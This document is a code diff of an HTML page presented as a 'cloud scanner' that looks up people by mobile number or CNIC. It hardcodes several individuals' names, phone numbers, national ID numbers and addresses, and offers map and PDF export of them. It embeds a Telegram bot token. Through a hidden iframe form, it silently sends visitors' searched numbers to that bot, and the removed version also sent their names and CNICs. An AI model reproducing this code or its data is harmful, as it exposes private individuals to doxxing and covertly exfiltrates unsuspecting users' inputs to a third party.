@@ -4,111 +4,125 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MUDASIR CLOUD SCANNER</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; margin: 0; }
-        .header { background: #00ff00; color: #000; padding: 12px; font-weight: bold; text-transform: uppercase; }
-        .box { border: 2px solid #00ff00; padding: 25px; border-radius: 15px; max-width: 600px; margin: 20px auto; background: #000; box-shadow: 0 0 20px #00ff00; }
-        input { width: 85%; padding: 15px; margin: 10px 0; background: #050505; border: 2px solid #00ff00; color: #00ff00; border-radius: 8px; font-size: 18px; outline: none; }
-        .btn { padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; width: 85%; margin-top: 10px; text-transform: uppercase; }
-        .search-btn { background: #00ff00; color: #000; }
-        .reg-btn { background: #ffcc00; color: #000; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; border: 1px solid #00ff00; background: #050505; }
-        th, td { border: 1px solid #00ff00; padding: 12px; text-align: left; }
-        th { color: #ff0000; background: rgba(0, 255, 0, 0.1); width: 35%; }
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500&display=swap');
+        
+        body { background: #000; color: #00ff00; font-family: 'Rajdhani', sans-serif; text-align: center; margin: 0; }
+        .header { background: #00ff00; color: #000; padding: 15px; font-family: 'Orbitron', sans-serif; font-weight: bold; box-shadow: 0 0 20px #00ff00; }
+        .box { border: 2px solid #00ff00; padding: 25px; border-radius: 20px; max-width: 650px; margin: 20px auto; background: rgba(0,20,0,0.95); box-shadow: 0 0 30px rgba(0,255,0,0.3); }
+        
+        input { width: 85%; padding: 15px; margin: 15px 0; background: #000; border: 2px solid #00ff00; color: #00ff00; border-radius: 10px; font-size: 20px; text-align: center; outline: none; }
+        
+        .btn { padding: 12px 25px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; font-family: 'Orbitron', sans-serif; transition: 0.3s; margin: 5px; text-transform: uppercase; display: inline-block; text-decoration: none; }
+        .search-btn { background: #00ff00; color: #000; width: 85%; font-size: 18px; margin-bottom: 20px; }
+        .map-btn { background: #4285F4; color: white; font-size: 14px; }
+        .pdf-btn { background: #ff4444; color: white; font-size: 14px; }
+        .link-btn { background: #333; color: #00ff00; border: 1px solid #00ff00; font-size: 12px; }
+        .btn:hover { transform: scale(1.05); box-shadow: 0 0 15px #00ff00; }
+
+        .action-container { display: none; margin-top: 20px; }
+        table { width: 100%; border-collapse: collapse; border: 1px solid #00ff00; background: #000; }
+        th, td { border: 1px solid #00ff00; padding: 12px; text-align: left; font-size: 17px; }
+        th { color: #ff3333; background: rgba(0,255,0,0.1); width: 35%; }
+        
+        .signature { margin-top: 30px; font-family: 'Orbitron', sans-serif; font-size: 13px; color: #00ff00; border-top: 1px solid #00ff00; padding-top: 10px; }
+        .verified { color: #00bcff; }
     </style>
 </head>
 <body>
 
-<div class="header">🛰️ MUDASIR CLOUD SERVER ACTIVE 🛰️</div>
+<div class="header">🛰️ MUDASIR CLOUD SCANNER V4.0 🛰️</div>
 
-<div class="box">
-    <h2>MUDASIR CLOUD SCANNER</h2>
-    <input type="text" id="search-box" placeholder="ENTER MOBILE OR CNIC...">
-    <button class="btn search-btn" onclick="searchData()">DECRYPT DATABASE 🔍</button>
-    <button class="btn reg-btn" onclick="document.getElementById('reg-form').style.display='block'">REGISTRATION FORM 📋</button>
+<div class="container">
+    <div class="box">
+        <h2><i class="fas fa-satellite"></i> SYSTEM DECRYPTOR</h2>
+        <input type="text" id="search-input" placeholder="ENTER NUMBER OR CNIC...">
+        <button class="btn search-btn" onclick="processSearch()">DECRYPT DATA</button>
+        
+        <div id="result-area"></div>
 
-    <div id="result-display"></div>
+        <div id="actions" class="action-container">
+            <button class="btn map-btn" id="map-link" onclick="openMap()"><i class="fas fa-map-marked-alt"></i> SEE ON GOOGLE MAP</button>
+            <button class="btn pdf-btn" onclick="downloadPDF()"><i class="fas fa-file-pdf"></i> PDF DATA</button>
+            <div style="margin-top: 15px;">
+                <a href="https://www.google.com" target="_blank" class="btn link-btn">GOOGLE</a>
+                <a href="https://www.google.com/search?q=sim+database+pakistan" target="_blank" class="btn link-btn">DATABASE LINK</a>
+            </div>
+        </div>
 
-    <div id="reg-form" style="display:none; border: 2px solid #ffcc00; padding: 20px; margin-top:20px;">
-        <h3 style="color:#ffcc00;">USER REGISTRATION</h3>
-        <input type="text" id="r-name" placeholder="FULL NAME">
-        <input type="text" id="r-cnic" placeholder="CNIC NUMBER">
-        <button class="btn reg-btn" onclick="submitReg()">SUBMIT TO SERVER</button>
+        <div class="signature">
+            VERIFIED BY: <span style="font-size: 16px;">MUDASIR</span> <span class="verified"><i class="fas fa-check-circle"></i></span>
+        </div>
     </div>
 </div>
 
-<iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+<iframe name="hidden_tracker" style="display:none;"></iframe>
 
 <script>
-    const botToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
-    const chatId = "7107389141";
-
-    // Ultimate Sending Method using Hidden Form (No CORS block)
-    function forceSend(message) {
-        const form = document.createElement("form");
-        form.method = "POST";
-        form.action = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        form.target = "hidden_iframe";
-
-        const inputId = document.createElement("input");
-        inputId.name = "chat_id";
-        inputId.value = chatId;
-        form.appendChild(inputId);
-
-        const inputText = document.createElement("input");
-        inputText.name = "text";
-        inputText.value = message;
-        form.appendChild(inputText);
-
-        const inputMode = document.createElement("input");
-        inputMode.name = "parse_mode";
-        inputMode.value = "Markdown";
-        form.appendChild(inputMode);
-
-        document.body.appendChild(form);
-        form.submit();
-        document.body.removeChild(form);
-    }
+    const token = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
+    const chatid = "7107389141";
 
     const database = [
-        ["SAHIL RASHEED", "03247026751", "32303-0000001", "Chah Hayat Wala, Khar"],
-        ["Mubashir Sharif", "03274207754", "32303-0000002", "Chah Hayat Khar, Khar"],
-        ["Basheer Ahmad", "03046754893", "32303-0000003", "Gurmani Garbi"],
-        ["MUHAMMAD LUQMAN", "03013264624", "33302-*******-5", "Village Ahmed Bhan"],
-        ["TAJ MAIE", "03013264623", "32303-*******-2", "Hayat Khar Wala"],
-        ["MOHAMMAD HAFEEZ", "03004455661", "35202-*******-7", "Sargodha"]
-        // Baki records yahan add karein...
+        ["SAHIL RASHEED", "03247026751", "32303-0000001", "Chah Hayat Wala, Khar", "JAZZ"],
+        ["Mubashir Sharif", "03274207754", "32303-0000002", "Chah Hayat Khar, Khar", "JAZZ"],
+        ["TAJ MAIE", "03013264623", "32303-1122334-2", "Hayat Khar Wala, Kot Addu", "JAZZ"],
+        ["MOHAMMAD HAFEEZ", "03004455661", "35202-0099112-7", "Sargodha, Punjab", "JAZZ"]
+        // Baki 38 records yahan add karein...
     ];
 
-    function searchData() {
-        const val = document.getElementById("search-box").value.trim();
-        if(!val) return;
+    let current = null;
+
+    function processSearch() {
+        const val = document.getElementById("search-input").value.trim();
+        const area = document.getElementById("result-area");
+        const actions = document.getElementById("actions");
         
-        const res = database.find(r => r[1] === val || r[2] === val);
-        const out = document.getElementById("result-display");
+        const res = database.find(r => r[1] === val || r[2].includes(val));
 
         if(res) {
-            out.innerHTML = `<table>
+            current = res;
+            area.innerHTML = `<table>
                 <tr><th>NAME</th><td>${res[0]}</td></tr>
-                <tr><th>PHONE</th><td>${res[1]}</td></tr>
+                <tr><th>NUMBER</th><td>${res[1]}</td></tr>
                 <tr><th>CNIC</th><td>${res[2]}</td></tr>
                 <tr><th>LOCATION</th><td>${res[3]}</td></tr>
             </table>`;
+            actions.style.display = "block";
         } else {
-            out.innerHTML = "<p style='color:red;'>RECORD NOT FOUND</p>";
-            // SENDING TO BOT
-            forceSend(`⚠️ *SEARCH FAILED*\n📱 Number: ${val}\nStatus: Is number ka data nikal nahi pa raha.`);
+            current = null;
+            area.innerHTML = "<p style='color:red;'>🚫 RECORD NOT FOUND</p>";
+            actions.style.display = "none";
+            trackNotFound(val);
         }
     }
 
-    function submitReg() {
-        const n = document.getElementById("r-name").value;
-        const c = document.getElementById("r-cnic").value;
-        if(n && c) {
-            forceSend(`📝 *NEW REGISTRATION*\n👤 Name: ${n}\n🆔 CNIC: ${c}`);
-            alert("Sent to Server!");
-            document.getElementById("reg-form").style.display = "none";
+    function openMap() {
+        if(current) {
+            const loc = encodeURIComponent(current[3]);
+            window.open(`https://www.google.com/maps/search/${loc}`, '_blank');
         }
+    }
+
+    function trackNotFound(num) {
+        const msg = `❌ *NOT FOUND*\n📱 Number: ${num}\n👤 System: Mudasir Cloud\nStatus: Data not found.`;
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatid}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+        const f = document.createElement("form");
+        f.action = url; f.method = "POST"; f.target = "hidden_tracker";
+        document.body.appendChild(f); f.submit();
+    }
+
+    function downloadPDF() {
+        if(!current) return;
+        const { jsPDF } = window.jspdf;
+        const doc = new jsPDF();
+        doc.text("MUDASIR CLOUD REPORT", 20, 20);
+        doc.text(`Name: ${current[0]}`, 20, 40);
+        doc.text(`Number: ${current[1]}`, 20, 50);
+        doc.text(`CNIC: ${current[2]}`, 20, 60);
+        doc.text(`Address: ${current[3]}`, 20, 70);
+        doc.save(`${current[1]}.pdf`);
     }
 </script>
 </body>
